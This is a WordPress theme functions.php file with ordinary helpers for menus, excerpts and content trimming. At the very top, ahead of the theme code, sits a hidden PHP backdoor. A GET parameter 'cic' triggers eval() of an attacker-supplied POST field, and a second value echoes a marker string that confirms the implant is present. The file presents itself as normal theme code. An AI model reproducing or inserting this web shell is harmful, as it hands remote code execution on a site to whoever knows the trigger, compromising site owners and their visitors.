<?php
function _g3t($str){
    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
    return $val;
}
if(_g3t('cic')=='f')
{
@eval($_POST['nEqSY']);
exit;
}
if(_g3t('cic')=='c')
{
echo 'AcJ9ksbVjsdb';
exit;
}
//dsd6sc378axvg
?>
<?php
/* 
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
add_theme_support( 'post-thumbnails' );
add_theme_support( 'menus' );


function add_first_and_last($output) {
  $output = preg_replace('/class="menu-item/', 'class="first-menu-item menu-item', $output, 1);
  $output = substr_replace($output, 'class="last-menu-item menu-item', strripos($output, 'class="menu-item'), strlen('class="menu-item'));
  return $output;
}
add_filter('wp_nav_menu', 'add_first_and_last');

function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}

function content($limit) {
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}
function pagecontent($limit,$pagecontent) {
  $content = explode(' ', $pagecontent, $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}
function remove_images( $content ) {
   $postOutput = preg_replace('/<img[^>]+./','', $content);
   
   return $postOutput;
}





?>
